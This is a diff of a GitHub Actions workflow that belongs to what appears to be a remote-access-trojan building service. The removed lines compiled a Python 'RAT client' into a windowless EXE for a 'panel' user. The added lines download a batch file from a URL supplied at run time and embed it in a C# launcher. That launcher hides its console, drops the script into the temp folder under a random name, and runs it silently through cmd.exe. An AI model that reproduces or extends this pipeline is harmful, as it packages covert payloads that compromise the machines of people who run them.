@@ -1,62 +1,117 @@
-name: Convert Python to EXE
+name: Build BAT EXE
+
+run-name: Build ${{ inputs.job }}
 
 on:
+  workflow_dispatch:
+    inputs:
+      job:
+        description: Job ID
+        required: true
+        type: string
+      file_url:
+        description: URL to download .bat
+        required: true
+        type: string
+      name:
+        description: Output EXE name
+        required: false
+        default: client
+        type: string
+
   repository_dispatch:
-    types: [convert_file]
+    types: [convert_bat]
 
 jobs:
   build:
     runs-on: windows-latest
     steps:
-    - uses: actions/checkout@v4
+      - name: Resolve inputs
+        id: cfg
+        shell: pwsh
+        run: |
+          if ($env:GITHUB_EVENT_NAME -eq "repository_dispatch") {
+            $job = "${{ github.event.client_payload.job_id }}"
+            $url = "${{ github.event.client_payload.file_url }}"
+            $name = "${{ github.event.client_payload.name }}"
+            if (-not $name) { $name = "client" }
+          } else {
+            $job = "${{ inputs.job }}"
+            $url = "${{ inputs.file_url }}"
+            $name = "${{ inputs.name }}"
+          }
+          if (-not $name) { $name = "client" }
+          "job=$job" >> $env:GITHUB_OUTPUT
+          "url=$url" >> $env:GITHUB_OUTPUT
+          "name=$name" >> $env:GITHUB_OUTPUT
+          Write-Host "job=$job name=$name"
 
-    - uses: actions/setup-python@v5
-      with:
-        python-version: '3.10'
+      - name: Download BAT
+        shell: pwsh
+        env:
+          FILE_URL: ${{ steps.cfg.outputs.url }}
+        run: |
+          Invoke-WebRequest -Uri $env:FILE_URL -OutFile "payload.bat" -UseBasicParsing
+          if (-not (Test-Path "payload.bat")) { throw "download failed" }
+          $len = (Get-Item "payload.bat").Length
+          Write-Host "bat size=$len"
 
-    - name: Install deps
-      run: |
-        python -m pip install --upgrade pip
-        pip install pyinstaller pycryptodome
+      - name: Build launcher EXE (csc)
+        shell: pwsh
+        env:
+          APP_NAME: ${{ steps.cfg.outputs.name }}
+        run: |
+          $bat = [IO.File]::ReadAllText("payload.bat")
+          # escape for C# verbatim string
+          $escaped = $bat.Replace('"', '""')
+          $safe = ($env:APP_NAME -replace '[^A-Za-z0-9._-]', '_')
+          if (-not $safe) { $safe = "client" }
 
-    - name: Download User File
-      shell: pwsh
-      run: |
-        $url = "${{ github.event.client_payload.file_url }}"
-        if (-not $url) { throw "missing file_url in client_payload" }
-        Invoke-WebRequest -Uri $url -OutFile "script.py"
-        # Sanity: must contain embedded panel USER (never leftover placeholder)
-        $txt = Get-Content -Raw "script.py"
-        if ($txt -match 'USER = "%USER%"') { throw "USER placeholder not replaced in source" }
-        if ($txt -notmatch 'USER = "') { throw "USER assignment missing in source" }
-        Write-Host "Source OK — panel user embedded"
+          $cs = @"
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
 
-    - name: Download Icon (optional)
-      shell: pwsh
-      run: |
-        $icon = "${{ github.event.client_payload.icon_url }}"
-        if ($icon -and $icon.Trim() -ne "") {
-          Invoke-WebRequest -Uri $icon -OutFile "app.ico"
-          echo "HAS_ICON=1" >> $env:GITHUB_ENV
-        } else {
-          echo "HAS_ICON=0" >> $env:GITHUB_ENV
-        }
+class Program {
+  [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
+  [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-    - name: Build EXE (pure client only — no binder/tool merge)
-      shell: pwsh
-      run: |
-        # Pure single-file RAT client. Do NOT add extra binaries or binders here.
-        if ($env:HAS_ICON -eq "1") {
-          pyinstaller --onefile --noconsole --name script --clean --icon=app.ico --hidden-import=Crypto --hidden-import=Crypto.Cipher.AES script.py
-        } else {
-          pyinstaller --onefile --noconsole --name script --clean --hidden-import=Crypto --hidden-import=Crypto.Cipher.AES script.py
-        }
-        if (-not (Test-Path "dist/script.exe")) { throw "EXE not produced" }
+  static void Main() {
+    try {
+      var hw = GetConsoleWindow();
+      if (hw != IntPtr.Zero) ShowWindow(hw, 0);
+    } catch {}
+    string bat = @"$escaped";
+    string path = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".cmd");
+    File.WriteAllText(path, bat);
+    var psi = new ProcessStartInfo();
+    psi.FileName = "cmd.exe";
+    psi.Arguments = "/c \"" + path + "\"";
+    psi.WindowStyle = ProcessWindowStyle.Hidden;
+    psi.CreateNoWindow = true;
+    psi.UseShellExecute = false;
+    try { Process.Start(psi); } catch {}
+  }
+}
+"@
+          [IO.File]::WriteAllText("launcher.cs", $cs)
 
-    - name: Upload artifact (unique per job_id)
-      uses: actions/upload-artifact@v4
-      with:
-        # CRITICAL: include job_id so the panel never grabs another user's EXE
-        name: converted_exe_${{ github.event.client_payload.job_id }}
-        path: dist/script.exe
-        retention-days: 1
+          $csc = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+          if (-not (Test-Path $csc)) {
+            $csc = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
+          }
+          if (-not (Test-Path $csc)) { throw "csc.exe not found" }
+
+          New-Item -ItemType Directory -Force -Path dist | Out-Null
+          & $csc /nologo /target:winexe /optimize+ /out:"dist\$safe.exe" launcher.cs
+          if (-not (Test-Path "dist\$safe.exe")) { throw "compile failed" }
+          Write-Host "built dist\$safe.exe size=$((Get-Item dist\$safe.exe).Length)"
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: converted_exe
+          path: dist/*.exe
+          if-no-files-found: error
+          retention-days: 1
